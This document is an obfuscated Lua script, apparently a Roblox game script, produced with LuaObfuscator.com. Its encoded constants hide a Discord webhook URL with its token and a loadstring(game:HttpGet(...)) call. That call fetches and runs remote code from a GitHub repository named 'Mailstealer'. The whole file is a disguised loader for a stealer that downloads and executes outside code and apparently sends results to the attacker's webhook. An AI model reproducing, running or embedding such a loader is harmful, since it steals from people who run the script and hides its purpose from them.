local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v24,v25)local v26={};for v41=1, #v24 do v6(v26,v0(v4(v1(v2(v24,v41,v41 + 1 )),v1(v2(v25,1 + (v41% #v25) ,1 + (v41% #v25) + 1 )))%256 ));end return v5(v26);end local v8=tonumber;local v9=string.byte;local v10=string.char;local v11=string.sub;local v12=string.gsub;local v13=string.rep;local v14=table.concat;local v15=table.insert;local v16=math.ldexp;local v17=getfenv or function()return _ENV;end ;local v18=setmetatable;local v19=pcall;local v20=select;local v21=unpack or table.unpack ;local v22=tonumber;local function v23(v27,v28,...)local v29=1;local v30;v27=v12(v11(v27,15 -10 ),v7("\125\145","\157\83\191\231"),function(v42)if (v9(v42,2)==79) then v30=v8(v11(v42,1,1));return "";else local v90=0;local v91;while true do if (v90==0) then v91=v10(v8(v42,16));if v30 then local v122=0;local v123;while true do if (0==v122) then v123=v13(v91,v30);v30=nil;v122=1;end if (v122==1) then return v123;end end else return v91;end break;end end end end);local function v31(v43,v44,v45)if v45 then local v92=0;local v93;while true do if (v92==0) then v93=(v43/(2^(v44-1)))%(2^(((v45-1) -(v44-1)) + (2 -1))) ;return v93-(v93%1) ;end end else local v94=0;local v95;while true do if (v94==0) then v95=2^(v44-1) ;return (((v43%(v95 + v95))>=v95) and 1) or 0 ;end end end end local function v32()local v46=0;local v47;while true do if (v46==1) then return v47;end if (v46==0) then v47=v9(v27,v29,v29);v29=v29 + 1 ;v46=1;end end end local function v33()local v48=0;local v49;local v50;while true do if (v48==1) then return (v50 * 256) + v49 ;end if (v48==0) then v49,v50=v9(v27,v29,v29 + 2 );v29=v29 + 2 ;v48=1;end end end local function v34()local v51=0;local v52;local v53;local v54;local v55;while true do if (v51==0) then v52,v53,v54,v55=v9(v27,v29,v29 + (5 -2) );v29=v29 + 4 ;v51=1;end if (v51==1) then return (v55 * 16777216) + (v54 * 65536) + (v53 * 256) + v52 ;end end end local function v35()local v56=0;local v57;local v58;local v59;local v60;local v61;local v62;while true do if (v56==1) then v59=2 -1 ;v60=(v31(v58,1,20) * (2^(651 -(555 + 64)))) + v57 ;v56=2;end if (v56==2) then v61=v31(v58,21,31);v62=((v31(v58,32)==1) and  -1) or 1 ;v56=3;end if (0==v56) then v57=v34();v58=v34();v56=1;end if (v56==3) then if (v61==0) then if (v60==0) then return v62 * 0 ;else v61=1;v59=0;end elseif (v61==2047) then return ((v60==0) and (v62 * (1/0))) or (v62 * NaN) ;end return v16(v62,v61-1023 ) * (v59 + (v60/(2^52))) ;end end end local function v36(v63)local v64;if  not v63 then local v96=0;while true do if (v96==0) then v63=v34();if (v63==0) then return "";end break;end end end v64=v11(v27,v29,(v29 + v63) -1 );v29=v29 + v63 ;local v65={};for v80=1, #v64 do v65[v80]=v10(v9(v11(v64,v80,v80)));end return v14(v65);end local v37=v34;local function v38(...)return {...},v20("#",...);end local function v39()local v66={};local v67={};local v68={};local v69={v66,v67,nil,v68};local v70=v34();local v71={};for v82=1,v70 do local v83=0;local v84;local v85;while true do if (0==v83) then v84=v32();v85=nil;v83=1;end if (v83==1) then if (v84==1) then v85=v32()~=0 ;elseif (v84==2) then v85=v35();elseif (v84==3) then v85=v36();end v71[v82]=v85;break;end end end v69[3]=v32();for v86=1,v34() do local v87=v32();if (v31(v87,1,1)==(931 -(857 + 74))) then local v97=0;local v98;local v99;local v100;while true do if (v97==2) then if (v31(v99,1,1)==(1 + 0)) then v100[2]=v71[v100[2]];end if (v31(v99,2,2)==1) then v100[3]=v71[v100[1 + 2 ]];end v97=3;end if (v97==1) then v100={v33(),v33(),nil,nil};if (v98==0) then local v132=0;while true do if (v132==0) then v100[3]=v33();v100[931 -(214 + 713) ]=v33();break;end end elseif (v98==1) then v100[3]=v34();elseif (v98==2) then v100[3]=v34() -(2^16) ;elseif (v98==3) then v100[3]=v34() -(2^16) ;v100[4]=v33();end v97=2;end if (v97==3) then if (v31(v99,3,880 -(282 + 595) )==1) then v100[4]=v71[v100[4]];end v66[v86]=v100;break;end if (v97==0) then v98=v31(v87,2,3);v99=v31(v87,4,6);v97=1;end end end end for v88=1,v34() do v67[v88-(1638 -(1523 + 114)) ]=v39();end return v69;end local function v40(v73,v74,v75)local v76=0;local v77;local v78;local v79;while true do if (v76==0) then v77=v73[1];v78=v73[2];v76=1;end if (1==v76) then v79=v73[3];return function(...)local v105=v77;local v106=v78;local v107=v79;local v108=v38;local v109=1;local v110= -1;local v111={};local v112={...};local v113=v20("#",...) -1 ;local v114={};local v115={};for v119=0 + 0 ,v113 do if (v119>=v107) then v111[v119-v107 ]=v112[v119 + 1 ];else v115[v119]=v112[v119 + (1 -0) ];end end local v116=(v113-v107) + 1 ;local v117;local v118;while true do local v120=0;while true do if (0==v120) then v117=v105[v109];v118=v117[1];v120=1;end if (v120==1) then if (v118<=18) then if (v118<=(1073 -(68 + 997))) then if (v118<=3) then if (v118<=1) then if (v118==0) then v115[v117[1272 -(226 + 1044) ]]=v115[v117[3]]%v117[4] ;else do return;end end elseif (v118>2) then v115[v117[8 -6 ]]=v115[v117[3]] + v117[4] ;else local v145=0;local v146;local v147;local v148;local v149;while true do if (1==v145) then v110=(v148 + v146) -1 ;v149=0;v145=2;end if (v145==2) then for v319=v146,v110 do local v320=0;while true do if (v320==0) then v149=v149 + 1 ;v115[v319]=v147[v149];break;end end end break;end if (v145==0) then v146=v117[2];v147,v148=v108(v115[v146](v21(v115,v146 + 1 ,v117[3])));v145=1;end end end elseif (v118<=5) then if (v118==4) then local v150=0;local v151;local v152;local v153;while true do if (v150==1) then v153=v115[v151] + v152 ;v115[v151]=v153;v150=2;end if (2==v150) then if (v152>0) then if (v153<=v115[v151 + 1 ]) then local v395=0;while true do if (v395==0) then v109=v117[3];v115[v151 + 3 ]=v153;break;end end end elseif (v153>=v115[v151 + 1 ]) then v109=v117[3];v115[v151 + 3 ]=v153;end break;end if (v150==0) then v151=v117[119 -(32 + 85) ];v152=v115[v151 + 2 ];v150=1;end end else v109=v117[3];end elseif (v118<=(6 + 0)) then v115[v117[2]]=v75[v117[3]];elseif (v118==7) then local v232=0;local v233;while true do if (0==v232) then v233=v117[2];v115[v233]=v115[v233](v21(v115,v233 + 1 ,v117[3]));break;end end else local v234=0;local v235;local v236;local v237;while true do if (2==v234) then for v367=1,v117[4] do local v368=0;local v369;while true do if (v368==0) then v109=v109 + 1 ;v369=v105[v109];v368=1;end if (v368==1) then if (v369[2 -1 ]==12) then v237[v367-(1 -0) ]={v115,v369[3]};else v237[v367-(1 -0) ]={v74,v369[3]};end v114[ #v114 + 1 ]=v237;break;end end end v115[v117[2]]=v40(v235,v236,v75);break;end if (v234==0) then v235=v106[v117[3]];v236=nil;v234=1;end if (1==v234) then v237={};v236=v18({},{[v7("\202\146\44\35\236\116\237","\17\149\205\69\77\136")]=function(v370,v371)local v372=v237[v371];return v372[1 + 0 ][v372[2]];end,[v7("\152\248\245\82\101\219\142\163\194\227","\224\199\167\155\55\18\178")]=function(v373,v374,v375)local v376=0;local v377;while true do if (0==v376) then v377=v237[v374];v377[958 -(892 + 65) ][v377[2]]=v375;break;end end end});v234=2;end end end elseif (v118<=(363 -(87 + 263))) then if (v118<=10) then if (v118==9) then local v157=0;local v158;while true do if (v157==0) then v158=v117[2];do return v115[v158](v21(v115,v158 + 1 ,v117[3]));end break;end end elseif v115[v117[2]] then v109=v109 + 1 ;else v109=v117[183 -(67 + 113) ];end elseif (v118<=11) then local v159=0;while true do if (v159==3) then v115[v117[2]]=v115[v117[3]][v117[4]];v109=v109 + 1 ;v117=v105[v109];v159=4;end if (v159==0) then v115[v117[2]]=v75[v117[3]];v109=v109 + 1 ;v117=v105[v109];v159=1;end if (7==v159) then if  not v115[v117[2]] then v109=v109 + 1 ;else v109=v117[3 + 0 ];end break;end if (v159==5) then v115[v117[2]]=v115[v117[3]][v117[4]];v109=v109 + 1 ;v117=v105[v109];v159=6;end if (v159==6) then v115[v117[2]]=v75[v117[3]];v109=v109 + 1 ;v117=v105[v109];v159=7;end if (v159==4) then v115[v117[2]]=v75[v117[3]];v109=v109 + 1 ;v117=v105[v109];v159=5;end if (2==v159) then v115[v117[2]]=v75[v117[3]];v109=v109 + 1 ;v117=v105[v109];v159=3;end if (v159==1) then v115[v117[2 + 0 ]]=v115[v117[3]][v117[4]];v109=v109 + (2 -1) ;v117=v105[v109];v159=2;end end elseif (v118==12) then v115[v117[7 -5 ]]=v115[v117[3]];else v115[v117[2]]=v115[v117[3]]%v115[v117[4]] ;end elseif (v118<=15) then if (v118==14) then local v160=0;local v161;local v162;while true do if (v160==0) then v161=v117[954 -(802 + 150) ];v162=v115[v117[3]];v160=1;end if (v160==1) then v115[v161 + 1 ]=v162;v115[v161]=v162[v117[4]];break;end end else v115[v117[2]]=v117[3] + v115[v117[4]] ;end elseif (v118<=16) then if  not v115[v117[2]] then v109=v109 + (2 -1) ;else v109=v117[3];end elseif (v118==17) then local v243=0;local v244;local v245;local v246;local v247;while true do if (v243==0) then v244=v117[2];v245,v246=v108(v115[v244](v115[v244 + 1 ]));v243=1;end if (v243==2) then for v378=v244,v110 do v247=v247 + (1 -0) ;v115[v378]=v245[v247];end break;end if (v243==1) then v110=(v246 + v244) -1 ;v247=0;v243=2;end end else local v248=0;local v249;local v250;local v251;local v252;while true do if (v248==8) then if (v115[v117[1189 -(1069 + 118) ]]==v117[4]) then v109=v109 + 1 ;else v109=v117[3];end break;end if (v248==3) then v117=v105[v109];v115[v117[2]]=v117[8 -5 ];v109=v109 + 1 ;v248=4;end if (5==v248) then v110=(v251 + v252) -1 ;v249=0 + 0 ;for v381=v252,v110 do local v382=0;while true do if (0==v382) then v249=v249 + 1 ;v115[v381]=v250[v249];break;end end end v248=6;end if (v248==2) then v252=v117[2];v115[v252]=v115[v252](v21(v115,v252 + (998 -(915 + 82)) ,v117[3]));v109=v109 + 1 ;v248=3;end if (v248==4) then v117=v105[v109];v252=v117[2];v250,v251=v108(v115[v252](v21(v115,v252 + 1 ,v117[3])));v248=5;end if (v248==7) then v115[v252]=v115[v252](v21(v115,v252 + 1 ,v110));v109=v109 + 1 ;v117=v105[v109];v248=8;end if (1==v248) then v115[v117[2 + 0 ]]=v117[3];v109=v109 + 1 ;v117=v105[v109];v248=2;end if (0==v248) then v249=nil;v250,v251=nil;v252=nil;v248=1;end if (v248==6) then v109=v109 + (1 -0) ;v117=v105[v109];v252=v117[2];v248=7;end end end elseif (v118<=28) then if (v118<=23) then if (v118<=20) then if (v118>19) then do return v115[v117[2]]();end else local v164=0;local v165;while true do if (v164==0) then v165=v117[4 -2 ];v115[v165](v21(v115,v165 + 1 ,v110));break;end end end elseif (v118<=21) then v115[v117[2]]={};elseif (v118>22) then v115[v117[3 -1 ]]=v117[3];else local v255=v117[2];do return v21(v115,v255,v110);end end elseif (v118<=(5 + 20)) then if (v118>24) then local v167=0;local v168;local v169;local v170;while true do if (v167==1) then v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v117[3];v109=v109 + 1 ;v167=2;end if (v167==2) then v117=v105[v109];v115[v117[2]]= #v115[v117[3]];v109=v109 + 1 ;v117=v105[v109];v167=3;end if (3==v167) then v115[v117[2]]=v117[3];v109=v109 + 1 ;v117=v105[v109];v170=v117[2];v167=4;end if (v167==0) then v168=nil;v169=nil;v170=nil;v115[v117[2]]={};v167=1;end if (v167==4) then v169=v115[v170];v168=v115[v170 + (3 -1) ];if (v168>0) then if (v169>v115[v170 + 1 ]) then v109=v117[3];else v115[v170 + 3 ]=v169;end elseif (v169<v115[v170 + 1 ]) then v109=v117[3];else v115[v170 + 3 ]=v169;end break;end end else local v171;local v172,v173;local v174;v115[v117[2]]=v115[v117[3]];v109=v109 + 1 + 0 ;v117=v105[v109];v115[v117[793 -(368 + 423) ]]=v74[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v74[v117[9 -6 ]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v74[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[20 -(10 + 8) ]]=v74[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v115[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[7 -5 ]]=v115[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v115[v117[3]] + v117[4] ;v109=v109 + 1 ;v117=v105[v109];v174=v117[2];v172,v173=v108(v115[v174](v21(v115,v174 + (443 -(416 + 26)) ,v117[3])));v110=(v173 + v174) -1 ;v171=0 -0 ;for v217=v174,v110 do local v218=0;while true do if (v218==0) then v171=v171 + 1 ;v115[v217]=v172[v171];break;end end end v109=v109 + 1 ;v117=v105[v109];v174=v117[2];v115[v174]=v115[v174](v21(v115,v174 + 1 ,v110));v109=v109 + 1 ;v117=v105[v109];v115[v117[1 + 1 ]]=v74[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[3 -1 ]]=v74[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[440 -(145 + 293) ]]=v115[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]= #v115[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v115[v117[3]]%v115[v117[4]] ;v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v117[3] + v115[v117[4]] ;v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]= #v115[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v115[v117[3]]%v115[v117[4]] ;v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v117[433 -(44 + 386) ] + v115[v117[4]] ;v109=v109 + (1487 -(998 + 488)) ;v117=v105[v109];v115[v117[2]]=v115[v117[3]] + v117[4] ;v109=v109 + 1 ;v117=v105[v109];v174=v117[2];v172,v173=v108(v115[v174](v21(v115,v174 + 1 ,v117[3])));v110=(v173 + v174) -1 ;v171=0;for v219=v174,v110 do v171=v171 + 1 ;v115[v219]=v172[v171];end v109=v109 + 1 ;v117=v105[v109];v174=v117[2];v172,v173=v108(v115[v174](v21(v115,v174 + 1 + 0 ,v110)));v110=(v173 + v174) -1 ;v171=0;for v222=v174,v110 do v171=v171 + 1 ;v115[v222]=v172[v171];end v109=v109 + 1 + 0 ;v117=v105[v109];v174=v117[2];v115[v174]=v115[v174](v21(v115,v174 + 1 ,v110));v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v115[v117[3]]%v117[4] ;v109=v109 + 1 ;v117=v105[v109];v174=v117[2];v172,v173=v108(v115[v174](v115[v174 + 1 ]));v110=(v173 + v174) -1 ;v171=0;for v225=v174,v110 do local v226=0;while true do if (v226==0) then v171=v171 + 1 ;v115[v225]=v172[v171];break;end end end v109=v109 + 1 ;v117=v105[v109];v174=v117[2];v115[v174](v21(v115,v174 + 1 ,v110));end elseif (v118<=26) then v75[v117[3]]=v115[v117[2]];elseif (v118==27) then v115[v117[2]]();else v115[v117[2]]=v115[v117[3]][v117[4]];end elseif (v118<=33) then if (v118<=30) then if (v118>29) then if (v115[v117[2]]==v117[4]) then v109=v109 + 1 ;else v109=v117[775 -(201 + 571) ];end else local v190=v117[2];local v191,v192=v108(v115[v190](v21(v115,v190 + 1 ,v110)));v110=(v192 + v190) -(1139 -(116 + 1022)) ;local v193=0;for v227=v190,v110 do v193=v193 + 1 ;v115[v227]=v191[v193];end end elseif (v118<=31) then local v194=0;local v195;while true do if (0==v194) then v195=v117[2];v115[v195]=v115[v195](v21(v115,v195 + 1 ,v110));break;end end elseif (v118>32) then local v259=0;local v260;local v261;local v262;local v263;local v264;while true do if (v259==4) then v115[v117[2]]=v74[v117[10 -7 ]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v115[v117[3]];v259=5;end if (v259==0) then v260=nil;v261=nil;v262,v263=nil;v264=nil;v259=1;end if (v259==6) then v117=v105[v109];v264=v117[2];v262,v263=v108(v115[v264](v21(v115,v264 + 1 ,v117[3])));v110=(v263 + v264) -1 ;v259=7;end if (v259==5) then v109=v109 + 1 ;v117=v105[v109];for v383=v117[2],v117[3] do v115[v383]=nil;end v109=v109 + 1 ;v259=6;end if (v259==8) then v264=v117[2];v260=v115[v264];for v385=v264 + 1 ,v110 do v15(v260,v115[v385]);end break;end if (v259==2) then v109=v109 + 1 ;v117=v105[v109];v115[v117[2 + 0 ]]=v74[v117[10 -7 ]];v109=v109 + 1 ;v259=3;end if (v259==3) then v117=v105[v109];v115[v117[2]]={};v109=v109 + 1 ;v117=v105[v109];v259=4;end if (v259==1) then v115[v117[2]]=v74[v117[3]];v109=v109 + (4 -3) ;v117=v105[v109];v115[v117[2]]=v74[v117[3]];v259=2;end if (v259==7) then v261=859 -(814 + 45) ;for v386=v264,v110 do local v387=0;while true do if (v387==0) then v261=v261 + 1 ;v115[v386]=v262[v261];break;end end end v109=v109 + 1 ;v117=v105[v109];v259=8;end end else for v317=v117[2],v117[3] do v115[v317]=nil;end end elseif (v118<=35) then if (v118==34) then local v196;local v197,v198;local v199;local v200;v115[v117[2]]=v117[3];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v117[3];v109=v109 + 1 ;v117=v105[v109];v200=v117[2];v115[v200]=v115[v200](v21(v115,v200 + 1 ,v117[3]));v109=v109 + 1 ;v117=v105[v109];v75[v117[3]]=v115[v117[2]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v117[3];v109=v109 + (2 -1) ;v117=v105[v109];v75[v117[3]]=v115[v117[2]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v74[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[1 + 1 ]]=v117[3];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v117[3];v109=v109 + 1 ;v117=v105[v109];v200=v117[2];v115[v200]=v115[v200](v21(v115,v200 + 1 ,v117[3]));v109=v109 + 1 ;v117=v105[v109];v75[v117[3]]=v115[v117[2]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v75[v117[3]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v75[v117[2 + 1 ]];v109=v109 + 1 ;v117=v105[v109];v200=v117[2];v199=v115[v117[3]];v115[v200 + 1 ]=v199;v115[v200]=v199[v117[889 -(261 + 624) ]];v109=v109 + 1 ;v117=v105[v109];v115[v117[2]]=v117[3];v109=v109 + 1 ;v117=v105[v109];v200=v117[2];v197,v198=v108(v115[v200](v21(v115,v200 + 1 ,v117[4 -1 ])));v110=(v198 + v200) -1 ;v196=1080 -(1020 + 60) ;for v230=v200,v110 do local v231=0;while true do if (v231==0) then v196=v196 + 1 ;v115[v230]=v197[v196];break;end end end v109=v109 + 1 ;v117=v105[v109];v200=v117[2];v115[v200]=v115[v200](v21(v115,v200 + 1 ,v110));v109=v109 + (1424 -(630 + 793)) ;v117=v105[v109];v115[v117[2]]();v109=v109 + 1 ;v117=v105[v109];v109=v117[9 -6 ];else v115[v117[9 -7 ]]= #v115[v117[3]];end elseif (v118<=36) then v115[v117[1 + 1 ]]=v74[v117[3]];elseif (v118>37) then local v265=0;local v266;local v267;while true do if (v265==1) then for v388=v266 + 1 ,v110 do v15(v267,v115[v388]);end break;end if (v265==0) then v266=v117[2];v267=v115[v266];v265=1;end end else local v268=v117[2];local v269=v115[v268];local v270=v115[v268 + (6 -4) ];if (v270>0) then if (v269>v115[v268 + 1 ]) then v109=v117[3];else v115[v268 + 3 ]=v269;end elseif (v269<v115[v268 + (1748 -(760 + 987)) ]) then v109=v117[3];else v115[v268 + (1916 -(1789 + 124)) ]=v269;end end v109=v109 + 1 ;break;end end end end;end end end return v40(v39(),{},v28)(...);end v23("LOL!0D3O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403053O006D6174636803083O00746F6E756D62657203053O007063612O6C00243O00120B3O00013O00206O000200122O000100013O00202O00010001000300122O000200013O00202O00020002000400122O000300053O00062O0003000A000100010004053O000A0001001206000300063O00201C000400030007001206000500083O00201C000500050009001206000600083O00201C00060006000A00060800073O000100062O000C3O00064O000C8O000C3O00044O000C3O00014O000C3O00024O000C3O00053O001206000800013O00201C00080008000B0012060009000C3O001206000A000D3O000608000B0001000100052O000C3O00074O000C3O00094O000C3O00084O000C3O000A4O000C3O000B4O000C000C000B4O0014000C00014O0016000C6O00013O00013O00023O00023O00026O00F03F026O00704002264O001900025O00122O000300016O00045O00122O000500013O00042O0003002100012O002400076O0018000800026O000900016O000A00026O000B00036O000C00046O000D8O000E00063O00202O000F000600014O000C000F6O000B3O00024O000C00036O000D00046O000E00016O000F00016O000F0006000F00102O000F0001000F4O001000016O00100006001000102O00100001001000202O0010001000014O000D00106O000C8O000A3O000200202O000A000A00024O0009000A6O00073O0001002O040003000500012O0024000300054O000C000400024O0009000300044O001600036O00013O00017O00043O00027O004003053O003A25642B3A2O033O0025642B026O00F03F001C3O0006085O000100012O00248O0021000100016O000200026O000300026O00048O000500036O00068O000700076O000500076O00043O000100201C000400040001002O12000500026O00030005000200122O000400036O000200046O00013O000200262O00010018000100040004053O001800012O000C00016O001500026O0009000100024O001600015O0004053O001B00012O0024000100044O0014000100014O001600016O00013O00013O00013O000D3O0003083O00557365724E616D6503133O00D0C4DE2BF2B3C20CD2D6D720F584C612C1CBDA03083O007EB1A3BB4586DBA703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31333435303O39302O3739303237342O362F387A556A39477958684558304C4B7865356659735F39496C7A57415A424A7A6B714D6256734B466A327948513445794F674B4A77364B6647316541306D52514D4E35303203093O00557365724E616D653203133O0022CA2FCBE82BC838C6E92FC839FAFD2FDD22C403053O009C43AD4AA5030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403433O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F45676F72696B7573612F4D61696C737465616C65722F6D61696E2F656E67696E65026O00F03F01183O00060A3O001600013O0004053O001600012O002400015O001222000200023O00122O000300036O00010003000200122O000100013O00122O000100053O00122O000100046O00015O00122O000200073O00122O000300086O00010003000200122O000100063O00122O000100093O00122O0002000A3O00202O00020002000B00122O0004000C6O000200046O00013O00024O00010001000100044O0017000100201C00013O000D2O00013O00017O00",v17(),...);
-- ⚠️ WARNING: integrity protected!
--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.13) ~  Much Love, Ferib 

]]--

